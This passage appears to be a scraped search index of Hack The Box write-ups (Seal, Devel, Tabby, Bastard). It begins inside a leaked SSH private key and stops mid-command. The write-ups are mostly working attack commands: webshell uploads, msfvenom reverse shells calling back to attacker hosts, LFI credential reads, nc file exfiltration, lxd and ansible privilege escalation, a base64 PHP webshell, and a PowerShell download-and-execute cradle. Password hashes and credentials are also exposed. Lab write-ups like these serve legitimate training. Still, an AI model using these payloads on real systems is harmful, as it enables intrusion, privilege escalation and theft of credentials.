wQCfhc5si+UU+SHfQBg9lm8d1YAfnXDP5X1wjz+GFw15lGbg1x4YBgIz0A8PijpXeVthz2 ib+73vdNZgUD9t2B0TiwogMs2UlxuTguWivb9JxAZdbzr8Ro1XBCU6wtzQb4e22licifaa WS/o1mRHOOP90jfpPOby8WZnDuLm4+IBzvcHFQaO7LUG2oPEwTl0ii7SmaXdahdCfQwkN5 NkfLXfUqg41nDOfLyRCqNAXu+pEbp8UIUl2tptCJo/zDzVsI4AAADBAOUwZjaZm6w/EGP6 KX6w28Y/sa/0hPhLJvcuZbOrgMj+8FlSceVznA3gAuClJNNn0jPZ0RMWUB978eu4J3se5O plVaLGrzT88K0nQbvM3KhcBjsOxCpuwxUlTrJi6+i9WyPENovEWU5c79WJsTKjIpMOmEbM kCbtTRbHtuKwuSe8OWMTF2+Bmt0nMQc9IRD1II2TxNDLNGVqbq4fhBEW4co1X076CUGDnx 5K5HCjel95b+9H2ZXnW9LeLd8G7oFRUQAAAMEAyHfDZKku36IYmNeDEEcCUrO9Nl0Nle7b Vd3EJug4Wsl/n1UqCCABQjhWpWA3oniOXwmbAsvFiox5EdBYzr6vsWmeleOQTRuJCbw6lc YG6tmwVeTbhkycXMbEVeIsG0a42Yj1ywrq5GyXKYaFr3DnDITcqLbdxIIEdH1vrRjYynVM ueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJ u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE= —–END OPENSSH PRIVATE KEY—–\n[root:/git/htb/seal]# chmod 600 id_rsa-luis [root:/git/htb/seal]# ssh luis@seal.htb -i id_rsa-luis luis@seal:~$ id && cat user.txt uid=1000(luis) gid=1000(luis) groups=1000(luis) b05995690f877efeb55302e8f09f296b\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nAlways try ‘sudo -l’ for a quick root.\n\nluis@seal:~$ sudo -l Matching Defaults entries for luis on seal: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\nUser luis may run the following commands on seal:\n    (ALL) NOPASSWD: /usr/bin/ansible-playbook *\nLooking on gtfobins we find that ansible-playbook are at the very top. Follow the steps to grab root.txt.\nluis@seal:~$ TF=\\((mktemp)\n  luis@seal:~\\) echo ‘[{hosts: localhost, tasks: [shell: /bin/sh /dev/tty 2&gt;/dev/tty]}]’ &gt;\\(TF\n  luis@seal:~\\) sudo /usr/bin/ansible-playbook $TF [WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match ‘all’\nPLAY [localhost] ***********************************************************************************************************************\n\nTASK [Gathering Facts] *****************************************************************************************************************\nok: [localhost]\n\nTASK [shell] ***************************************************************************************************************************\n# id && cat /root/root.txt\n  uid=0(root) gid=0(root) groups=0(root)\n  85239d7892c9f975905d49166e123084\n\n# cat /etc/shadow\n  root:$6$D8b4qJlaLsRsvwuy$qvUFLUdvoH0EsvrLSJCpejOmV7bZoCO2ZGH2ueU77uAHpxepSfK.ts4LkkfwzuJ.IJ87EeK9RrNKHEorKQp3r.:18752:0:99999:7:::\n  luis:$6$2tGOIZ.O0MqK5nDd$nl12rn9ftZIPGGiFjDKBItGJlKB4uIwsrjVqq6Bkp2C7DVEE9/T4VuZjT1kbZjHCfVgVRGP7sqnSCiu1IRIUZ.:18753:0:99999:7:::\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nBypass-403 Script: https://github.com/iamj0ker/bypass-403\nSynchronize Module (copy_links): https://docs.ansible.com/ansible/2.5/modules/synchronize_module.html\nZcat / Zgrep: https://www.blackmoreops.com/2014/08/01/z-commands-view-compressed-tar-gz-files-without-uncompressing/\nGTFObins ansible-playbook: https://gtfobins.github.io/gtfobins/ansible-playbook/"
  },
  {
    "objectID": "posts/2021-02-16-htb-writeup-devel/2021-02-16-htb-writeup-devel.html",
    "href": "posts/2021-02-16-htb-writeup-devel/2021-02-16-htb-writeup-devel.html",
    "title": "Devel - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/devel]# nmap -Pn -n -sCV 10.10.10.5 –open (master✱) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 01:06AM\n\naspnet_client | 03-17-17 04:37PM 689 iisstart.htm |03-17-17 04:37PM 184946 welcome.png | ftp-syst: | SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\nDIRB: ==&gt; DIRECTORY: http://10.10.10.5/aspnet_client/\nNIKTO:\n\nAllowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST\n\nThe FTP server is open for anonymous login, let see what we can do there.\n\n[root:/git/htb/devel]# ftp 10.10.10.5 (master✱) Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&gt; ? Commands may be abbreviated. Commands are:\n  !     dir     mdelete     qc      site\n  $     disconnect  mdir        sendport    size\n  account       exit        mget        put     status\n  append        form        mkdir       pwd     struct\n  ascii     get     mls     quit        system\n  bell      glob        mode        quote       sunique\n  binary        hash        modtime     recv        tenex\n  bye       help        mput        reget       tick\n  case      idle        newer       rstatus     trace\n  cd        image       nmap        rhelp       type\n  cdup      ipany       nlist       rename      user\n  chmod     ipv4        ntrans      reset       umask\n  close     ipv6        open        restart     verbose\n  cr        lcd     prompt      rmdir       ?\n  delete        ls      passive     runique\n  debug     macdef      proxy       send\nWe have the option to ‘put’ (upload) files to the ftp, and looking around it seems like we are in webroot. Lets upload a webshell and browse to it. Since it’s not a .php-server, lets upload a .aspx-shell.\nftp&gt; put aspxshell.aspx local: aspxshell.aspx remote: aspxshell.aspx 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 5273 bytes sent in 0.00 secs (22.0558 MB/s)\nGo to http://10.10.10.5/aspxshell.aspx to enumerate the box further.\n\nwhoami iis apppool\n\n\nInstead of looking around in a webshell, lets create a reverse aspx payload and upload it to the box.\n[root:/git/htb/devel]# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4488 -f aspx &gt; rev.aspx (master✱) [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of aspx file: 2721 bytes\nBrowse to http://10.10.10.5/rev.aspx to trigger the rev-shell.\n[root:/git/htb/devel]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.5] 49158 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved.\nc:&gt;whoami iis apppool\n\nI can’t find any vulnerabilities by just looking around. Watson is a Windows exploit suggester that we can run from a locally hosted SMB server. Download pre-compiled Watson and execute it on the victim, through your SMB-server.\n[root:/srv/pub-share]# service smbd start [root:/srv/pub-share]# cp /opt/winPE/binaries/watson/WatsonNet3.5AnyCPU.exe .\nc:&gt;\\10.10.14.10-share3.5AnyCPU.exe __ __  / / /  _ | | ___ ___ _   / / / ` | / |/  | ’_\n  /  / (| | |__  () | | | | / / _,|_|_/___/|| ||\n                           v0.1\n\n                  Sherlock sucks...\n                   @_RastaMouse\n\n [*] OS Build number: 7600\n [*] CPU Address Width: 32\n [*] Process IntPtr Size: 4\n [*] Using Windows path: C:\\WINDOWS\\System32\n\n  [*] Appears vulnerable to MS10-073\n   [&gt;] author: \"0xPThree\"\ndescription: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel. [&gt;] Exploit: https://www.exploit-db.com/exploits/36327/ [&gt;] Notes: None.\n  [*] Appears vulnerable to MS10-092\n   [&gt;] author: \"0xPThree\"\ndescription: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Also, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision, an attacker can execute arbitrary commands with SYSTEM privileges. [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb [&gt;] Notes: None.\n  [*] Appears vulnerable to MS11-046\n   [&gt;] author: \"0xPThree\"\ndescription: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges. [&gt;] Exploit: https://www.exploit-db.com/exploits/40564/ [&gt;] Notes: None.\n  [*] Appears vulnerable to MS12-042\n   [&gt;] author: \"0xPThree\"\ndescription: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in kernel mode. [&gt;] Exploit: https://www.exploit-db.com/exploits/20861/ [&gt;] Notes: None.\n  [*] Appears vulnerable to MS13-005\n   [&gt;] author: \"0xPThree\"\ndescription: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation. [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb [&gt;] Notes: None.\n [*] Finished. Found 5 vulns :)\n\nWe are presented with various vulnerabilities, MS11-046 sounds great as it “allows local users to elevate privileges” which is exatly what we want. Upload the malicious .exe to your local SMB server and execute it on the remove host.\n[root:/srv/pub-share]# cp /opt/windows-kernel-exploits/MS11-046/ms11-046.exe . [root:/srv/pub-share]# chmod +x ms11-046.exe\nc:&gt;\\10.10.14.10-share-046.exe \\10.10.14.10-share-046.exe\nc:&gt;whoami nt authority\nC:&gt;type user.txt.txt 9ecdd6a3aedf24b41562fea70f4cb3e8\nC:&gt;type root.txt e621a0b5041708797c4fc4728bc72b4b\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\n\n\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nPre-compiled Watson Binaries: https://github.com/carlospolop/winPE\nWindows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits"
  },
  {
    "objectID": "posts/2020-07-06-htb-writeup-tabby/2020-07-06-htb-writeup-tabby.html",
    "href": "posts/2020-07-06-htb-writeup-tabby/2020-07-06-htb-writeup-tabby.html",
    "title": "Tabby - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:/git/htb# nmap -Pn -sC -sV -n 10.10.10.194 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 00:47 CEST Nmap scan report for 10.10.10.194 Host is up (0.038s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB:\n\nhttp://10.10.10.194:8080/docs (CODE:302|SIZE:0)\nhttp://10.10.10.194:8080/examples (CODE:302|SIZE:0)\nhttp://10.10.10.194:8080/host-manager (CODE:302|SIZE:0)\nhttp://10.10.10.194:8080/index.html (CODE:200|SIZE:1895)\nhttp://10.10.10.194:8080/manager (CODE:302|SIZE:0)\n\nNIKTO:\n\n\n\nVisiting the webpage on port 80 we directly find;\n\nHostname megahosting.htb\nThe site is also made with Bootstrap Themes from 2016\nInformation about a breach linking to http://megahosting.htb/news.php?file=statement\n\nAdding megahosting.htb to /etc/hosts we are able to read their statement. Looking at the URI it looks vulnerable to LFI, testing this proves that that’s the case - instead of reading the file ‘statement’ we can read ‘../../../../../etc/passwd’.\nReading the passwd-file we find the user Ash; ash:x:1000:1000:clive:/home/ash:/bin/bash\nOn the port 8080 webserver we find a Tomcat9 server with a admin login prompt. Using the found LFI we can enumerate the tomcat server and look for credentials. To find the file structure I installed tomcat9 locally and enumerated the directories locally;\nroot@nidus:/usr/share/tomcat9# tree . .. ├── etc │   ├── server.xml │   ├── tomcat-users.xml │   └── web.xml\nWe find the user configuration file under /usr/share/tomcat9/etc/tomcat-users.xml. Curling this through our LFI gives us;\nroot@nidus:/git/htb/tabby# curl http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml ..    \nCREDENTIALS - tomcat:$3cureP4s5w0rd123!\nReading through the Tomcat documentation tells us that if we have access to the host-manager, we are able to add, remove and manage Virtual Hosts through curl.\nWe create a malicious payload: root@nidus:/git/htb/tabby# msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.44 lport=4488 -f war &gt; rev-shell.war Payload size: 1086 bytes Final size of war file: 1086 bytes\nUpload the shell: root@nidus:/git/htb/tabby# curl -u ‘tomcat’:‘$3cureP4s5w0rd123!’ -T rev.war ‘http://10.10.10.194:8080/manager/text/deploy?path=/rev-shell’ OK - Deployed application at context path [/rev-shell]\nList Deployed Shell: root@nidus:/git/htb/tabby# curl -u ‘tomcat’:‘$3cureP4s5w0rd123!’ http://10.10.10.194:8080/manager/text/list OK - Listed applications for virtual host [localhost] /:running:0:ROOT /examples:running:0:/usr/share/tomcat9-examples/examples /host-manager:running:0:/usr/share/tomcat9-admin/host-manager /rev-shell:running:0:rev-shell /manager:running:0:/usr/share/tomcat9-admin/manager /docs:running:0:/usr/share/tomcat9-docs/docs\nExecute Deployed Shell: root@nidus:/git/htb/tabby# curl -u ‘tomcat’:‘$3cureP4s5w0rd123!’ http://10.10.10.194:8080/rev-shell/\nroot@nidus:/usr/share/tomcat9# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.44] from (UNKNOWN) [10.10.10.194] 45912 whoami tomcat\nEnumerating using linpeas we find a suspicious zip-file that is password protected. We are unable to open it using the found password, so instead I think we might be able to brute force it. Transfer the file over to your local computer using nc.\ntomcat@tabby:/dev/shm$ ./linpeas.sh .. [+] Backup files? -rw-r–r– 1 ash ash 8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip\nStart listener locally: root@nidus:/git/htb/tabby# nc -lp 4433 &gt; 16162020_backup.zip\nTransfer the file from Victim Host: tomcat@tabby:/var/www/html/files$ nc -w3 10.10.14.44 4433 &lt; 16162020_backup.zip\nCrack the file using fcrackzip: root@nidus:/git/htb/tabby# fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip possible pw found: admin@it ()\nWe are now able to change to user ash:admin@it and grab user.txt\ntomcat@tabby:/var/www/html/files$ su ash Password: admin@it ash@tabby:/var/www/html/files$ cd /home/ash/ ash@tabby:~$ cat user.txt 3f11605318e3590cea5082935ac8d9cb\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nRunning Linpeas as Ash we see a, for me, unknown group - lxd. Googling for lxd privesc I find a short article explaining that that this is possible with a few short steps.\n====================================( Basic information )===================================== .. User & Groups: uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)\nDownload lxd alpine builder and build it LOCALLY before pushing it over to the vicitm.\nroot@nidus:/git/htb/tabby# git clone https://github.com/saghul/lxd-alpine-builder.git root@nidus:/git/htb/tabby# cd lxd-alpine-builder/ root@nidus:/git/htb/tabby/lxd-alpine-builder# ./build-alpine\nA tar.gz-file is created that we can push/pull to the victim. root@nidus:/git/htb/tabby/lxd-alpine-builder# ls -al -rw-r–r– 1 root root 3195037 Jul 6 16:56 alpine-v3.12-x86_64-20200706_1656.tar.gz\nPull the tar.gz-file and import it as an image. Mount to a container and profit, root taken.\nash@tabby:~$ wget http://10.10.14.44:8181/alpine-v3.12-x86_64-20200706_1656.tar.gz ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20200706_1656.tar.gz –alias p3-image If this is your first time running LXD on this machine, you should also run: lxd init To start your first instance, try: lxc launch ubuntu:18.04\n\nIf you started the box yourself, or no one has run lxd yet - write ‘lxd init’ and just press enter to access all default values.\nash@tabby:~$ lxc image list\n  +----------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+\n  |  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE         |\n  +----------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+\n  | p3-image | a17d99462fda | no     | alpine v3.12 (20200706_16:56) | x86_64       | CONTAINER | 3.05MB | Jul 6, 2020 at 1:18pm (UTC) |\n  +----------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+\nContinue to add a device and select the folder(s) you’d like to mount. In our case we mount the entire box (/) to /mnt/root.\nash@tabby:~$ lxc init p3-image ignite -c security.privileged=true\n  Creating ignite\nash@tabby:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true\n  Device mydevice added to ignite\nash@tabby:~$ lxc start ignite\nash@tabby:~$ lxc exec ignite /bin/sh\n~ # id\n  uid=0(root) gid=0(root)\n~ # cd /mnt/root/root/\n/mnt/root/root # cat root.txt\n  67667b1756a9729b7fadc7f7315019b9\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nTomCat; Add, Remove, Manage: https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_a_Directory_or_WAR_by_URL\nlxd PrivEsc: https://www.hackingarticles.in/lxd-privilege-escalation/"
  },
  {
    "objectID": "posts/2019-04-17-htb-writeup-irked/2019-04-17-htb-writeup-irked.html",
    "href": "posts/2019-04-17-htb-writeup-irked/2019-04-17-htb-writeup-irked.html",
    "title": "Irked - Hack The Box",
    "section": "",
    "text": "No writeup available.."
  },
  {
    "objectID": "posts/2021-02-25-htb-writeup-bastard/2021-02-25-htb-writeup-bastard.html",
    "href": "posts/2021-02-25-htb-writeup-bastard/2021-02-25-htb-writeup-bastard.html",
    "title": "Bastard - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/bastard]# nmap -Pn -n -sCV 10.10.10.9 –open (master✱) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |http-generator: Drupal 7 (http://drupal.org) | http-methods: | Potentially risky methods: TRACE | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Microsoft-IIS/7.5 |_http-title: Welcome to 10.10.10.9 | 10.10.10.9 135/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nDIRB:\nNIKTO:\n\nWe can see that the server is running ‘Drupal 7’, which is very vulnerable. A quick google for ‘drupal 7 rce exploit’ and we find the ruby script drupalgeddon2, download it and exploit.\n\n[root:/git/htb/bastard]# ./drupalgeddon.rb http://10.10.10.9/ (master✱) [*] –==[::#Drupalggedon2::]==– ——————————————————————————– [i] Target : http://10.10.10.9/ ——————————————————————————– [+] Found : http://10.10.10.9/CHANGELOG.txt (HTTP Response: 200) [+] Drupal!: v7.54 ——————————————————————————– [*] Testing: Form (user/password) [+] Result : Form valid - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Clean URLs [+] Result : Clean URLs enabled ——————————————————————————– [*] Testing: Code Execution (Method: name) [i] Payload: echo AFLLPNGO [+] Result : AFLLPNGO [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO! ——————————————————————————– [*] Testing: Existing file (http://10.10.10.9/shell.php) [i] Response: HTTP 404 // Size: 12 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Writing To Web Root (./) [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php [!] Target is NOT exploitable [2-4] (HTTP Response: 404)… Might not have write access? - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Existing file (http://10.10.10.9/sites/default/shell.php) [i] Response: HTTP 404 // Size: 12 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Writing To Web Root (sites/default/) [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php [!] Target is NOT exploitable [2-4] (HTTP Response: 404)… Might not have write access? - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Existing file (http://10.10.10.9/sites/default/files/shell.php) [i] Response: HTTP 404 // Size: 12 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Writing To Web Root (sites/default/files/) [*] Moving : ./sites/default/files/.htaccess [i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php [!] Target is NOT exploitable [2-4] (HTTP Response: 404)… Might not have write access? [!] FAILED : Couldn’t find a writeable web path ——————————————————————————– [*] Dropping back to direct OS commands drupalgeddon2&gt;&gt; whoami nt authority drupalgeddon2&gt;&gt; type C:.txt ba22fde1932d06eb76a163d312f921a2\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nGet a better shell, upgrade to Powershell.\n\ndrupalgeddon2&gt;&gt; powershell.exe IEX(New-Object Net.Webclient).downloadString(‘http://10.10.14.8/ps-rev.ps1’)\n[root:/srv/pub-share]# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) … 10.10.10.9 - - [02/Mar/2021 14:56:38] “GET /ps-rev.ps1 HTTP/1.1” 200 -\nroot@nidus:/git/htb/bastard# rlwrap nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.9] 50223 PS C:&gt; whoami nt authority\n\nCheck your privs, and if it’s possible to abuse them.\n\nPS C:&gt; whoami /all — snip — PRIVILEGES INFORMATION ———————-\nPrivilege Name          Description                               State\n======================= ========================================= =======\nSeChangeNotifyPrivilege Bypass traverse checking                  Enabled\nSeImpersonatePrivilege  Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege Create global objects                     Enabled\n‘SeImpersonatePrivilege’ is always interesting, this often mean we can get SYSTEM using JuicyPotato.\n\nJuice up the potato!\n\nCreate a payload and put it on SMB Share: [root:/git/htb/bastard]# msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.8 lport=4499 &gt; bastard-privesc.bat (master✱) [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder specified, outputting raw payload Payload size: 1583 bytes [root:/git/htb/bastard]# cp bastard-privesc.bat /srv/pub-share\nCheck system OS: PS 